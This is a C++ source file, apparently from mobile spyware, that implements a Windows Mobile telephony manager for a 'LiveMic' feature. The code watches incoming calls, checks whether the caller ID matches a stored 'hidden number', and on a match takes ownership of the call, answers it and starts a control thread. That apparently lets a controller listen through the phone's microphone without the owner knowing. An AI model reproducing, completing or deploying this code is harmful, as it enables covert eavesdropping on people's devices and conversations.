#include <windows.h>
#include <Tapi.h>
#include <extapi.h>
#include "TapiManager.h"

static void LineCallBack(DWORD hDevice, DWORD dwMessage, DWORD dwInstance, DWORD dwParam1, DWORD dwParam2, DWORD dwParam3)
{
	LiveMic* pLiveMic = pLiveMic->self();
	if (pLiveMic == NULL)
		return;

	switch (dwMessage) {
		case LINE_APPNEWCALL:
			DBG_TRACE(L"TapiManager LineCallBack LINE_APPNEWCALL", 5, FALSE);
			pLiveMic->HandleNewCall((HCALL)dwParam2);
			break;

		case LINE_CALLSTATE:

			switch(dwParam1) {
				case LINECALLSTATE_BUSY:
					DBG_TRACE(L"TapiManager LineCallBack LINECALLSTATE_BUSY", 5, FALSE);		
					break;
				case LINECALLSTATE_CONNECTED:
					DBG_TRACE(L"TapiManager LineCallBack LINECALLSTATE_CONNECTED", 5, FALSE);
					
					pLiveMic->StartCtrlTh();
					pLiveMic->LineCallStateConnected();

					//pLiveMic->AudioAdjust();
										  
					break;
				case LINECALLSTATE_DISCONNECTED:
					DBG_TRACE(L"TapiManager LineCallBack LINECALLSTATE_DISCONNECTED", 5, FALSE);
					
					//pLiveMic->AudioRestore();

					pLiveMic->LineCallStateDisconnected();
					pLiveMic->StopCtrlTh();
			
					break;
				case LINECALLSTATE_SPECIALINFO:	
					break;
				case LINECALLSTATE_DIALTONE:
					break;
				case LINECALLSTATE_OFFERING:
					DBG_TRACE(L"TapiManager LineCallBack LINECALLSTATE_OFFERING", 5, FALSE);
					pLiveMic->LineCallStateOffering((HCALL)dwParam2);
					
					break;
				default:
					break;
			}
			break;

		case LINE_CALLINFO:
			////TAPI_DEBUG(("\t\t|>%s", CallInfoStateString(dwParam1).c_str()));
			/*if (dwParam1 == LINECALLINFOSTATE_CALLERID) {
				//TAPI_DEBUG((">>> MSG LINECALLINFOSTATE_CALLERID"));
			}*/
			break;
		default:
			break;
	}
}

BOOL TapiManager::GetCallState(HCALL hCall, LPDWORD lpdwCallStatus)
{
	LONG rc = -1;
	ByteVector bv; bv.resize(sizeof(LINECALLSTATUS));
	LPLINECALLSTATUS lcs = (LINECALLSTATUS*) vectorptr(bv);
	lcs->dwUsedSize = sizeof(LINECALLSTATUS);

	rc = lineGetCallStatus(hCall, lcs);
	if (rc == LINEERR_STRUCTURETOOSMALL) {
		bv.resize(lcs->dwNeededSize);
		lcs->dwTotalSize = lcs->dwNeededSize;
		rc = lineGetCallStatus(hCall, lcs);
	}

	if (rc < 0) {
		DBG_TRACE_INT(L"TapiManager GetCallState lineGetCallStatus", 5, FALSE, rc);
		return FALSE;
	}

	*lpdwCallStatus = lcs->dwCallState;

	return TRUE;
}

BOOL TapiManager::CheckNumber(HCALL hCall, wstring numBase)
{
	ByteVector bv; bv.resize(sizeof(LINECALLINFO));
	LPLINECALLINFO ci = (LPLINECALLINFO) vectorptr(bv);
	ci->dwTotalSize = sizeof(LINECALLINFO);

	LONG rc = lineGetCallInfo(hCall, ci);

	if (rc < 0 && rc != LINEERR_STRUCTURETOOSMALL) {
		DBG_TRACE_INT(L"TapiManager CheckNumber lineGetCallInfo 1 ERROR:", 5, FALSE, rc);
		return FALSE;
	} else if (rc == LINEERR_STRUCTURETOOSMALL || ci->dwNeededSize > ci->dwTotalSize) {
		bv.resize(ci->dwNeededSize);
		ci = (LPLINECALLINFO)vectorptr(bv);
		ci->dwTotalSize = bv.size();
		rc = lineGetCallInfo(hCall, ci);

		if (rc < 0) {
			DBG_TRACE_INT(L"TapiManager CheckNumber lineGetCallInfo 2 ERROR:", 5, FALSE, rc);
			DBG_TRACE(L"TapiManager CheckNumber C ", 5, FALSE);
			return FALSE;
		}
	}

	DBG_TRACE_INT(L"TapiManager CheckNumber Flags: ", 5, FALSE, ci->dwCallerIDFlags);
						   
	if (ci->dwOrigin == LINECALLORIGIN_INBOUND && (ci->dwCallerIDFlags & LINECALLPARTYID_ADDRESS)) {
	
		wstring numCaller((WCHAR*)(vectorptr(bv) + ci->dwCallerIDOffset), 
							(WCHAR*)(vectorptr(bv)+ci->dwCallerIDOffset + ci->dwCallerIDSize));

		DBG_TRACE_INT(L"TapiManager CheckNumber tmp len: ", 5, FALSE,  numCaller.length());
		DBG_TRACE((PWCHAR)numCaller.c_str(), 5, FALSE);
		DBG_TRACE_INT(L"TapiManager CheckNumber telnum len: ", 5, FALSE,  numBase.length());
		DBG_TRACE((PWCHAR)numBase.c_str(), 5, FALSE);

		/*if (tmp.size() > telnum.size()) {
			tmp.resize(telnum.size());
		}*/
		
		if (numCaller.compare(numBase) == 0) {
			DBG_TRACE(L"TapiManager CheckNumber HIDDEN NUMBER compare", 5, FALSE);
			return TRUE;
		} else {

			wstring::size_type foundPos;
			wstring needle;
			wstring haystack;

			if (numBase.length() > numCaller.length()) {
				haystack = numBase;
				needle = numCaller;
			} else {
				haystack = numCaller;
				needle = numBase;
			}

			foundPos = haystack.find(needle, 0);

			DBG_TRACE_INT(L"TapiManager CheckNumber haystack.find(needle, 0): ", 5, FALSE, foundPos);

			if (foundPos != string::npos) {
				DBG_TRACE(L"TapiManager CheckNumber HIDDEN NUMBER", 5, FALSE);
				return TRUE;
			}
		}
	}

	return FALSE;
}

BOOL TapiManager::AnswerCall(HCALL hCall)
{
	LONG rc = -1;

	rc = lineSetCallPrivilege(hCall, LINECALLPRIVILEGE_OWNER);
	if (rc != 0) {
		DBG_TRACE_INT(L"TapiManager AnswerCall lineSetCallPrivilege ERROR:", 5, FALSE, rc);
		return FALSE;
	}

	rc = lineAnswer(hCall, "OUT", 4);

	if (rc < 0) {
		DBG_TRACE_INT(L"TapiManager AnswerCall lineAnswer ERROR:", 5, FALSE, rc);
		return FALSE;
	}

	return TRUE;
}

BOOL TapiManager::DropCall(HCALL hCall)
{
	LONG rc = lineSetCallPrivilege(hCall, LINECALLPRIVILEGE_OWNER);
	if (rc < 0) {
		DBG_TRACE_INT(L"TapiManager DropCall lineSetCallPrivilege ERROR:", 5, FALSE, rc);
		return FALSE;
	}

	rc = lineDrop(hCall, NULL, 0);
	if (rc < 0) {
		DBG_TRACE_INT(L"TapiManager DropCall lineDrop ERROR:", 5, FALSE, rc);
		return FALSE;
	}
	
	DBG_TRACE_INT(L"TapiManager DropCall OK", 5, FALSE, rc);

	return TRUE;
}

BOOL TapiManager::DeallocateCall(HCALL hCall)
{
	LONG rc = lineSetCallPrivilege(hCall, LINECALLPRIVILEGE_OWNER);
	if (rc < 0) {
		DBG_TRACE_INT(L"TapiManager DeallocateCall lineSetCallPrivilege ERROR:", 5, FALSE, rc);
		return FALSE;
	}									 

	rc = lineDeallocateCall(hCall);
	if (rc < 0) {
		DBG_TRACE_INT(L"TapiManager DeallocateCall lineDeallocateCall ERROR:", 5, FALSE, rc);
		return FALSE;
	}

	return TRUE;
}


#define TAPI_LOW_VERSION 0x10000
#define TAPI_HIGH_VERSION 0x20002
BOOL TapiManager::TapiGetDeviceCAPS(UINT dwDevNum, DWORD * dwApiVerNegoziated)
{
	BOOL bOut = FALSE;
	LONG rc = -1;
	DWORD dwApiLowVersion = TAPI_LOW_VERSION, dwApiHighVersion = TAPI_HIGH_VERSION;
	LINEEXTENSIONID extID; 
	ZeroMemory(&extID, sizeof(LINEEXTENSIONID));
		  
	UINT i = 0;
	rc = lineNegotiateAPIVersion(m_hLineApp,
									dwDevNum,
									dwApiLowVersion,
									dwApiHighVersion,
									dwApiVerNegoziated,
									&m_extID);
	if (rc != 0) {
		DBG_TRACE_INT(L"TapiManager TapiGetDeviceCAPS lineNegotiateAPIVersion ERROR:", 5, FALSE, rc);
		return bOut;
	}

	ByteVector bv; bv.resize(sizeof(LINEDEVCAPS));
	m_lpLineDevCaps = (LINEDEVCAPS*)vectorptr(bv);
	m_lpLineDevCaps->dwUsedSize = sizeof(LINEDEVCAPS);
	rc = lineGetDevCaps(m_hLineApp,
						dwDevNum,
						*dwApiVerNegoziated,
						0,
						m_lpLineDevCaps);

	if (rc < 0 && rc != LINEERR_STRUCTURETOOSMALL) {
		DBG_TRACE_INT(L"TapiManager TapiGetDeviceCAPS lineGetDevCaps 1 ERROR:", 5, FALSE, rc);
		UnInit();
		bv.clear();
		return bOut;
	} else if (rc == LINEERR_STRUCTURETOOSMALL || (m_lpLineDevCaps->dwNeededSize > m_lpLineDevCaps->dwTotalSize)) {
		bv.resize(m_lpLineDevCaps->dwNeededSize);
		m_lpLineDevCaps->dwTotalSize = m_lpLineDevCaps->dwNeededSize;

		rc = lineGetDevCaps(m_hLineApp,
								dwDevNum,
								*dwApiVerNegoziated,
								0,
								m_lpLineDevCaps);
		if (rc < 0) {
			DBG_TRACE_INT(L"TapiManager TapiGetDeviceCAPS lineGetDevCaps 2 ERROR:", 5, FALSE, rc);
			UnInit();
			bv.clear();
			return bOut;
		}			
	}

	if (m_lpLineDevCaps->dwMediaModes & LINEMEDIAMODE_INTERACTIVEVOICE ) {
		bOut = TRUE;	
	}

	bv.clear();

	return bOut;
}

BOOL TapiManager::Init()
{
	BOOL bOut = FALSE;
	LONG rc = -1;
	//DWORD dwNumDev;

	rc = lineInitialize(&m_hLineApp,
						NULL,
						&LineCallBack,
						L"LineCProg",
						&m_dwNumDev);
	if (rc < 0) {
		DBG_TRACE_INT(L"TapiManager Init lineInitialize ERROR:", 5, FALSE, rc);
		return bOut;
	}

	// Eventuale Check Roaming (vedi lineGetRegisterStatus LINEREGSTATUS_ROAM)
	if (rc == 0) {

		m_vectLines.resize(m_dwNumDev, NULL);
		m_vectApiVerNegoziated.resize(m_dwNumDev, NULL);

		for (UINT i = 0; i < m_dwNumDev; i++) {

			if (FALSE == TapiGetDeviceCAPS(i, &(m_vectApiVerNegoziated.at(i)))) {
				continue;	
			}

			rc = lineOpen(m_hLineApp,
							m_dwDeviceID,
							&(m_vectLines.at(i)),
							TAPI_CURRENT_VERSION,
							0,
							0,
							LINECALLPRIVILEGE_MONITOR,
							LINEMEDIAMODE_INTERACTIVEVOICE,
							NULL);
			if (rc != 0) {
				DBG_TRACE_INT(L"TapiManager Init lineOpen ERROR:", 5, FALSE, rc);
				UnInit();
				return bOut;
			}

			rc = lineSetStatusMessages(m_vectLines.at(i), LINEDEVSTATE_ALL, 0);
			if (rc != 0) {
				DBG_TRACE_INT(L"TapiManager Init lineSetStatusMessages ERROR:", 5, FALSE, rc);
				UnInit();
				return bOut;
			}

			DWORD dwLineStatus = 0;
			rc = lineGetRegisterStatus ( m_vectLines.at(i), &dwLineStatus);
			if (rc == 0) {
				DBG_TRACE_INT(L"TapiManager Init lineGetRegisterStatus dwLineStatus: ", 5, FALSE, dwLineStatus);	
			}
		}

		m_bInitialized = TRUE;
		bOut = TRUE;
	}

	return bOut;
}

BOOL TapiManager::UnInit()
{
	LONG rc = -1;

	if (m_bInitialized == FALSE) {
		DBG_TRACE(L"TapiManager UnInit m_bInitialized FALSE", 5, FALSE);
		return FALSE;
	}

	for (UINT i = 0; i < m_dwNumDev; i++) {
		if (m_vectLines.at(i) != NULL) {
			rc = lineClose(m_vectLines.at(i));
			m_vectLines.at(i) = NULL;
			if (rc < 0) {
				DBG_TRACE_INT(L"TapiManager UnInit lineClose ERROR:", 5, FALSE, rc);
			}
		}
	}
	m_vectLines.clear();
	m_vectApiVerNegoziated.clear();

	if (m_hLineApp != NULL) {
		rc = lineShutdown(m_hLineApp);
		if (rc < 0) {
			DBG_TRACE_INT(L"TapiManager UnInit lineShutdown ERROR:", 5, FALSE, rc);
		}
		m_hLineApp = NULL;
	}

	m_bInitialized = FALSE;

	return TRUE;
}

TapiManager* TapiManager::m_pInstance = NULL;
volatile LONG TapiManager::m_lLock = 0;

TapiManager* TapiManager::self() {

	while (InterlockedExchange((LPLONG) &m_lLock, 1) != 0)
		Sleep(1);

	if (NULL == m_pInstance) {
		m_pInstance = (TapiManager*) new(nothrow) TapiManager();
	}

	InterlockedExchange((LPLONG)&m_lLock, 0);

	return m_pInstance;
}

TapiManager::TapiManager(void)
{
	m_bInitialized = FALSE;
	m_hLineApp = NULL;
	m_dwDeviceID = m_dwNumDev = 0;
}

TapiManager::~TapiManager(void)
{
}